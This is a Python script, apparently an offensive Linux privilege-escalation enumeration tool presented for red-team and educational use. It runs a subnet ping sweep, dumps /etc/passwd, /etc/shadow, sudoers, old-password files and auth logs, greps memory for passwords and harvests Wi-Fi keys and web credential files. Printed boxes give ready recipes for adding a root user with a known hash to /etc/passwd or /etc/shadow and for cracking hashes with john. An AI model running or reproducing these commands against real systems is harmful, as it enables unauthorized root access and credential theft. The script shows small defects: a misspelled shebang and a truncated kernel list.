#!/usr/bin/env pyhton3
# -*- coding: utf-8 -*-
import os
import time
#------------------> Color Code:
RED="\033[01;31m"
BLUE="\033[0;37;44m"
GREEN="\033[01;40m"
XX="\033[0m" #--- COLSE COLOR
#------------------> Clear Screen:
print("\n",RED,"\n\n╚════{Clearing Terminal",XX)
time.sleep(0.5)
os.system("clear")
print(GREEN,"\n\n╚════{Loading Script...",XX)
time.sleep(2)
os.system("clear")
#------------------>Banner:
print("\n")
print("\n")
banner ="""
\t              ▄▄▄▄▄▄▄▄▄▄▄▄                
\t            ████████████████              
\t          ███████████████████▌             ██████╗███╗   ███╗ █████╗  ██████╗██╗  ██╗     ██████╗      ██████╗  █████╗  █████╗ ████████╗
\t        ▐██████████████████████           ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║     ╚════██╗     ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
\t          ▀▀▀▀████████████▀▀▀▀            ╚█████╗ ██╔████╔██║███████║╚█████╗ ███████║       ███╔═╝     ██████╔╝██║  ██║██║  ██║   ██║
\t    ▄▄▄██                      ██▄▄▄       ╚═══██╗██║╚██╔╝██║██╔══██║ ╚═══██╗██╔══██║     ██╔══╝       ██╔══██╗██║  ██║██║  ██║   ██║
\t██████████▄▄▄▄▄▄        ▄▄▄▄▄▄██████████  ██████╔╝██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║     ███████╗     ██║  ██║╚█████╔╝╚█████╔╝   ██║
\t      ▀▀▀██████████████████████▀▀▀        ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝     ╚══════╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝    ╚═╝
\t                                          ═════════════════════════════════════════════════════════{\033[01;31mPrivilege Escalation Script v2.5\033[0m}
\t                                          Tʜɪs sᴄʀɪᴘᴛ ɪs ᴏɴᴇ ᴏғ ᴘʀᴏᴊᴇᴄᴛHULK sᴄʀɪᴘᴛs, ɪᴛ ʜᴀs ʙᴇᴇɴ ᴅᴇsɪɢɴᴇᴅ ᴛᴏ sᴜᴘᴘᴏʀᴛ (SOC & Rᴇᴅ Tᴇᴀᴍ) 
\t         █                  █             ᴏʀ ɪᴛ  ᴄᴀɴ ʙᴇ ᴜsᴇ ғᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ  ᴘᴜʀᴘᴏsᴇs ɪɴ ғɪɴᴅɪɴɢ sʏsᴛᴇᴍ ᴠᴜʟɴᴇʀᴀʙɪʟɪᴛɪᴇs ᴛʜᴀᴛ ᴍᴀʏ ʟᴇᴀᴅ 
\t          █    ██▀▀▀▀██    █              ᴛᴏ ᴘʀɪᴠɪʟᴇɢᴇ  ᴇsᴄᴀʟᴀᴛɪᴏɴ & ᴇxᴘʟᴏɪᴛᴇ ɪᴛ. Tʜᴇ sᴄʀɪᴘᴛ sʜᴏᴜʟᴅ ʙᴇ ᴜsᴇᴅ  ɪɴ sᴀғᴇ ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ. Tʜᴇ 
\t           █  ▀        ▀  █               ᴀᴜᴛʜᴏʀ ɪs ɴᴏᴛ  ʀᴇsᴘᴏɴsɪʙʟᴇ ғᴏʀ ᴀɴʏ ᴍɪsᴜsᴇ ᴏғ ɪᴛ. ᴛʜᴇʀᴇғᴏʀ ʙʏ ʀᴇᴀᴅɪɴɢ ᴛʜɪs, ʏᴏᴜ ᴛᴀᴋᴇ ғᴜʟʟ
\t            ██▄████████▄██                ʀᴇsᴘᴏɴsɪʙɪʟɪᴛʏ ᴏғ ᴍɪsᴜsɪɴɢ ɪᴛ.
\t              ▀████████▀
\t                 ████
"""
print(banner)
time.sleep(1)
print("\n",BLUE,"Aᴜᴛʜᴏʀ:",XX)
time.sleep(0.1)
print("\t   Iʀᴏɴ Hᴜʟᴋ")
print("\tMᴀɴ Iɴ A Bʟᴀᴄᴋ Tᴜxᴇᴅᴏ")
time.sleep(0.1)
print("\n",BLUE+"Tᴡᴇᴇᴛ Mᴇ:",XX)
time.sleep(0.1)
print("\tɪʀᴏɴʜᴜʟᴋ_x69",XX)
time.sleep(0.1)
print("\n",BLUE+"Mᴇssᴀɢᴇ:",XX)
time.sleep(0.1)
print("\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇᴅ ʙᴀsᴇᴅ ᴏɴ ᴛʜᴇ ᴀᴜᴛʜᴏʀ's ᴏᴘɪɴɪᴏɴ, ʏᴏᴜ ᴍᴀʏ ᴜsᴇ ᴀɴʏ ᴏғ ʏᴏᴜʀ ᴄʜᴏɪᴄᴇ. Rᴇᴍᴇᴍᴇʙʀ, SKY HAS NO LIMITS :)")
time.sleep(0.1)
print("\n",BLUE+"Rᴇᴄᴏᴍᴍᴇɴᴅᴀᴛɪᴏɴ:",XX)
time.sleep(0.1)
print("\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.py > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ")
print("\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴛᴏ ᴜsᴇ ᴍᴀɴʏ ᴛᴏᴏʟs ᴀs ᴍᴜᴄʜ ᴀs ʏᴏᴜ ᴄᴀɴ.")
time.sleep(0.1)
print("\n",BLUE,"Sᴄᴀɴ Sᴛᴀʀᴛᴇᴅ Aᴛ:",XX)
os.system("date")
time.sleep(5)
print("\n",RED,"\t\tEnumeration on progress ╔═..................................(1%)......................................",XX,"         \n")
time.sleep(5)
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ════════════════════════════════════════[ Scanning Target Network ]═════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print(BLUE,"[+] Pivoting:",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Try to scan the host network and see if there is any other host online. However, we won't be able to access those   ║")
print("\t║machine. Therefor, we have to do tunneling from the current machine to them.                                        ║")
print("\t║Read More:                                                                                                          ║")
print("\t║  https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                            ║")
print("\t║  https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                ║")
print("\t║  https://pentest.blog/explore-hidden-networks-with-double-pivoting/                                                ║")
print("\t║  https://www.offensive-security.com/metasploit-unleashed/pivoting/                                                 ║")
print("\t║  https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/         ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
SCAN=str(input(BLUE+"[+] Do you want to scan the target network? [Y/N]:"+XX))
if SCAN=='Y' or SCAN=='y':
    OC1=input("[+] Enter 1st Octic: ")
    OC2=input("[+] Enter 2nd Octic: ")
    OC3=input("[+] Enter 3th Octic: ")
    print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
    print("\t║This will scan all 255 IPs, and may take time based on the network range, please be patient.                        ║")
    print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
    os.system("for i in $(seq 1 255); do (ping {}.{}.{}.$i -c 1 -w 2 >/dev/null && echo Host {}.{}.{}.$i Is Alive);done".format(OC1,OC2,OC3,OC1,OC2,OC3))
else:
    print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
    print("\t║Please have a look at the host network & findout if there is any device that you may pivite to. You can do it by any║")
    print("\t║of the following loop commands:                                                                                     ║")
    print('\t║    for ip in $(seq 1 255); do ping -c 1 A.B.C.$ip | grep "bytes from"; done                                        ║')
    print('\t║    for i in {1..255}; do ping -c 1 A.B.C.$i | grep "bytes from"; done                                              ║')
    print('\t║    for i in {1..255}; do (ping A.B.C.$i -c 1 -w 5  >/dev/null && echo "Host with IP $i Is Alive"); done            ║')
    print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ════════════════════════════════════════[ Current User Information ]════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n",BLUE,"[+] Current user is:",XX)
os.system ('whoami')
print("\n",BLUE,"[+] Sudo privileged access:",XX)
os.system("sudo -ln | grep -E --color=always 'NOPASSWD|ALL|$'")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Incase you have the password, run: sudo -l and find a way to exploit that file.                                     ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Who's logged in:",XX)
os.system ('w')
print("\n",BLUE,"[+] Login History:",XX)
os.system ('last -Faiw | last | grep still --color=always')
print("\n",BLUE,"[+] Last Log In:",XX)
os.system ('lastlog | grep -v "**Never logged in**"')
print("\n",BLUE,"[+] Root Users:",XX)
os.system ("awk -F: '($3 == '0') {print}' /etc/passwd | grep root --color=always")
print("\n",BLUE,"[+] Users with console:",XX)
os.system ("cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'")
print("\n",BLUE,"[+] Total number of users:",XX)
os.system ("getent passwd | wc -l")
print("\n",BLUE,"[+] Can we read other users’ history files?",XX)
os.system ("find /* -iname *.*history* -print 2>/dev/null")
print("\n",BLUE,"[+] Are we in a restricted shell?",XX)
os.system ('env | grep -i "rbash\|chroot"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Bypass Restricted Shell:                                                                                            ║")
print("\t║  https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf                             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] User ID:",XX)
os.system ('id')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc, Docker, Wheel, Shadow, Disk, Video. Every ║")
print("\t║group worths Googling for exploit.                                                                                  ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] User ID:",XX)
os.system ('cat /var/log/auth.log')
print("\n",BLUE,"[+] User Group & possible escap:",XX)
os.system ('id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow" 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Docker group:                                                                                                       ║")
print("\t║https://gtfobins.github.io/gtfobins/docker/                                                                         ║")
print("\t║https://www.hackingarticles.in/docker-privilege-escalation/                                                         ║")
print("\t║====================================================================================================================║")
print("\t║LXD/LXC group:                                                                                                      ║")
print("\t║https://www.hackingarticles.in/lxd-privilege-escalation/                                                            ║")
print("\t║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                              ║")
print("\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation    ║")
print("\t║====================================================================================================================║")
print("\t║Samashare group:                                                                                                    ║")
print("\t║https://www.securityfocus.com/bid/9619/exploit                                                                      ║")
print("\t║====================================================================================================================║")
print("\t║lpadmin group:                                                                                                      ║")
print("\t║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                            ║")
print("\t║Usually members of the group adm have permissions to read log files located inside /var/log/                        ║")
print("\t║Usually members of the group adm have permissions to read log files located inside /var/log/                        ║")
print("\t║====================================================================================================================║")
print("\t║sudo/admin group:                                                                                                   ║")
print("\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║")
print("\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║")
print("\t║====================================================================================================================║")
print("\t║Video group:                                                                                                        ║")
print("\t║The video group can be used locally to give a set of users access to a video device or to the screen output.        ║")
print("\t║This could be exploit d by taking a screenshot of the current screen output and gathering any private information   ║")
print("\t║such as user passwords or hashes.                                                                                   ║")
print("\t║Esc from video:-                                                                                                    ║")
print("\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║")
print("\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║")
print("\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║")
print("\t║====================================================================================================================║")
print("\t║Disk group:                                                                                                         ║")
print("\t║The disk group provides users with access to the raw data contained in disks and partitions.                        ║")
print("\t║Esc from disk:-                                                                                                     ║")
print("\t║https://github.com/frizb/Linux-Privilege-Escalation                                                                 ║")
print("\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║")
print("\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║")
print("\t║====================================================================================================================║")
print("\t║Shadow group:                                                                                                       ║")
print("\t║Since users in this group have access to view the /etc/shadow file, this can be exploit d by cracking password      ║")
print("\t║hashes found in it.                                                                                                 ║")
print("\t║Esc from shadow:-                                                                                                   ║")
print("\t║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                     ║")
print("\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                             ║")
print("\t║====================================================================================================================║")
print("\t║Adm group:                                                                                                          ║")
print("\t║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ══════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] Each field is separated by a colon, and represents a different attribute to the user:",XX)
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>                                       ║")
print("\t║If an -x- is representing the password field, this indicates that the password is encrypted.                        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
time.sleep(1)
print("\n",BLUE,"[+] Password file:",XX)
os.system ("ls -la /etc/passwd --color=always")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the file has write permission to the curent user or curent user group, it can be abused by adding a new user with║")
print("\t║root privilege to the file. If those flag are not set, then the file is protected.                                  ║")
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║",RED,"First, generate a password with one of the following commands:",XX,"                                                  ║")
print("\t║    ",RED,"openssl passwd -1 -salt hulk password",XX,"                                                                       ║")
print('\t║    ',RED,'perl -le "print crypt(hulk, password)"',XX,'                                                                      ║')
print("\t║",RED,"Overwrite the password file:",XX,"                                                                                    ║")
print('\t║    ',RED,'echo "hulk:HASH:0:0::/root:/bin/bash" >> /etc/passwd',XX,'                                                        ║')
print("\t║",RED,"Then do: su hulk",XX,"                                                                                                ║")
print("\t║Read more:                                                                                                          ║")
print("\t║  https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/                                  ║")
print("\t║Protect the file by limiting the access to it:                                                                      ║")
print("\t║  chmod 600 /etc/passwd                                                                                             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Reading Password File:",XX)
os.system ('cat /etc/passwd | grep -E ":0:0:|$"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║All linux systems will print this information, our aim is to find hash value to be cracked. However, the file can be║")
print("\t║protected by not giving read permission to othe groups or users on the system.                                      ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Hash in Password File:",XX)
os.system ("grep  -v 'x' /etc/passwd")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If any hash is found in the /etc/passwd, the attacker my try to crack it by using any hash cracker software or tool ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Shadow file:",XX)
os.system ('ls -la /etc/shadow --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the file has write or read permission to the curent user or curent user group, it can abuse by replacing the root║")
print("\t║HASH with the attacker's HASH or the attacker my copy the hash & try to crack it.                                   ║")
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║",RED,"1) Generate a new Shadow Hash and replace it with thecurrent root hash:",XX,"                                         ║")
print("\t║    ",RED,"- mkpasswd  -m sha-512 -S prove123 -s",XX,"                                                                       ║")
print("\t║",RED,"2) Open the shadow file using any text editor of your choice:",XX,"                                                   ║")
print("\t║   ",RED,"or copy your HASH from your system and replace it with the root hash",XX,"                                         ║")
print("\t║",RED,"3) Login to root using your password",XX,"                                                                            ║")
print("\t║",RED,"4) Or Simply do:",XX,"                                                                                                ║")
print("\t║",RED,"echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/shadow",XX,"                                          ║")
print("\t║",RED,"This adds a root privilege user 'privesc' with the password 'password'",XX,"                                          ║")
print("\t║Read More:                                                                                                          ║")
print("\t║  https://linuxize.com/post/etc-shadow-file/                                                                        ║")
print("\t║  https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html                                ║")
print("\t║Protect the file by limiting the access to it:                                                                      ║")
print("\t║  chmod 600 /etc/shadow                                                                                             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Reading shadow File:",XX)
os.system ('cat /etc/shadow')
print("\n",BLUE,"[+] Hash in Shadow File: (Interesting :D)",XX)
os.system ("grep  -v '*:\|!:' /etc/shadow")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Crack the hash using online website or any cracking tools or run this on the target machine:                        ║")
print("\t║    ",RED,"unshadow /etc/passwd /etc/shadow > shadow.john",XX,"                                                              ║")
print("\t║    ",RED,"john shadow.john --wordlist=<WORLD_LIST>",XX,"                                                                    ║")
print("\t║You may also crack the hash by copying the hash or shadow.john file to your OS and do:                              ║")
print("\t║    ",RED,"john –wordlist=<WORLD_LIST> hash",XX,"                                                                            ║")
print("\t║If you own the system and have root, you can use MimiPenguin to crack it:                                           ║")
print("\t║  https://github.com/huntergregal/mimipenguin                                                                       ║")
print("\t║  https://github.com/sevagas/swap_digger                                                                            ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Sudoers file:",XX)
os.system ('ls -la /etc/sudoers --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                                ║")
print("\t║Read more:                                                                                                          ║")
print("\t║  https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d              ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Reading Sudoers File:",XX)
os.system ("cat /etc/sudoers | grep -E --color=always 'ALL|$'")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║The sudo command allows non root users to run commands that would normally require super user privileges. If the    ║")
print("\t║running file or the application has a global vulnerability or file permission misconfiguration, the attacker may    ║")
print("\t║google the vulnerability or abuse the file for user escalation.                                                     ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] User Group list:",XX)
os.system ('ls -la /etc/group --color=always')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║It stores group information or defines the user groups i.e. it defines the groups to which users belong.            ║")
print("\t║Read more:                                                                                                          ║")
print("\t║  https://www.cyberciti.biz/faq/understanding-etcgroup-file/                                                        ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Content of User Group list:",XX)
os.system('cat /etc/group')
print("\n",BLUE,"[+] Password Policy:",XX)
os.system ('grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Read more:                                                                                                          ║")
print("\t║  https://www.linuxfordevices.com/tutorials/linux/linux-password-policies                                           ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Root History File:",XX)
os.system ('ls -la /root/.*_history --color=always 2>/dev/null')
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═══════════════════════════════════════[ Credentials Harvesting ]═══════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║To list all files having the word password/credentials/hash do the following manually:                              ║")
print("\t║",RED,'grep -rn -i "pass\|cred\|hash" / --color=always > password.txt',XX,"                                                  ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
time.sleep(1)
print("\n",BLUE,"[+] Find 'Pass, Hash, Cred' as a file name:",XX)
os.system ('find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2> /dev/null | xargs ls -ld 2> /dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"')
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║Excluded: /usr/ | /var/ | /opt/ | /sys/                                                                             ║")
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Bash History:",XX)
os.system ('find / -iname *_history -xdev 2> /dev/null | xargs ls -ld')
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║Bash and other scripting languages, along with various services often store previous commands run in the system,    ║")
print( '\t║which could contain clear-text or encoded passwords if they are hard-coded in the command itself                    ║')
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] /etc/security/opasswd file permission:",XX)
os.system ('ls -la /etc/security/opasswd')
print("\n",BLUE,"[+] Reading old passwords in /etc/security/opasswd:",XX)
os.system ('cat /etc/security/opasswd')
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║The /etc/security/opasswd file is used by pam_cracklib (a module used in Linux to ensure a good password policy is  ║")
print( '\t║in place) to store the hashed version of old passwords used on the system to prevent users from reusing the same    ║')
print( '\t║over and over again.                                                                                                ║')
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] In memory passwords:",XX)
os.system ('strings /dev/mem -n10 | grep -i PASS')
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║Services will sometimes store the credentials entered by the end user in clear text in memory. The commands below   ║")
print( '\t║can help find credentials stored in processes                                                                       ║')
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Password Files:",XX)
os.system ("find / -iname passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always")
print("\n",BLUE,"[+] WiFi Creds:",XX)
os.system ('ls -la /etc/NetworkManager/system-connections')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Try to read the following files manually and see if they have any password stored inside them.                      ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Sensitive files:",XX)
os.system ('ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║",RED,"See if any listed files have weak file permission.",XX,"                                                              ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] htpasswd:",XX)
os.system ('find / -iname .htpasswd -print -exec cat {} \; 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║It is a flat-file used to store usernames and password. This file is generally used by the web server software like ║")
print("\t║Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are in ASCII text format.The    ║")
print("\t║hash maybe cracked using online tools or any cracking password tools.                                               ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Firefox credentials:",XX)
os.system ('ls -la /home/$USER/.mozilla/firefox 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Password files are:                                                                                                 ║")
print("\t║  key4.db                                                                                                           ║")
print("\t║  logins.json                                                                                                       ║")
print("\t║Read more about where Firefox stores your bookmarks, passwords and other user data:                                 ║")
print("\t║  https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data                                      ║")
print("\t║You can use firefox_decrypt.py tool:                                                                                ║")
print('\t║  https://github.com/unode/firefox_decrypt                                                                          ║')
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Passwords in smb.conf file:",XX)
os.system ("cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always")
print("\n",BLUE,"[+] Dump cleartext Pre-Shared Wireless Keys:",XX)
os.system ('cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"')
print("\n",BLUE,"[+] Find config.* files 'Excluded /var/ | /usr/':",XX)
os.system ("find / -iname config.* 2> /dev/null | grep -v '/var/\|/usr/' | xargs ls -ld")
print("\n",BLUE,"[+] Any credentials in apache2.conf file:",XX)
os.system ("cat /etc/apache2/apache2.conf | grep -i 'pass\|cred\|hash' --color=always")
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║Read the full file for more inofrmation.                                                                            ║")
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] Configuration files that might contain sensitive information:",XX)
os.system ('grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always')
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
print(RED," \t\t ═════════════════════════════════════════[ System Information ]═════════════════════════════════════════ ",XX)
print(RED," \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝",XX)
print("\n")
time.sleep(1)
print("\n",BLUE,"[+] System Name:",XX)
os.system ('uname -a')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Useful tools to help you in finding kernel exploit:                                                                 ║")
print('\t║  https://github.com/spencerdodd/kernelpop                                                                          ║')
print('\t║  https://github.com/jondonas/linux-exploit-suggester-2                                                             ║')
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"[+] System Release:",XX)
os.system ('cat /etc/*-release')
print("\n",BLUE,"[+] Host name:",XX)
os.system ('hostname')
print("\n",BLUE,"[+] System Version:",XX)
os.system ('cat /proc/version')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║The version is not listed in our database. However, make sure to keep your system always up-to-date. Old version are║")
print("\t║always vulnerable. Visit the link                                                                                   ║")
print("\t║bellow for more details:                                                                                            ║")
print("\t║  https://github.com/SecWiki/linux-kernel-exploits                                                                  ║")
print('\t║Or use:                                                                                                             ║')
print('\t║  searchsploit "Linux version"                                                                                      ║')
print('\t║  https://github.com/InteliSecureLabs/Linux_Exploit_Suggester                                                       ║')
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n\033[0;37;41mList of vulnerable kernel versions:",XX)
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║")
print("\t║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║")
print("\t║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║")
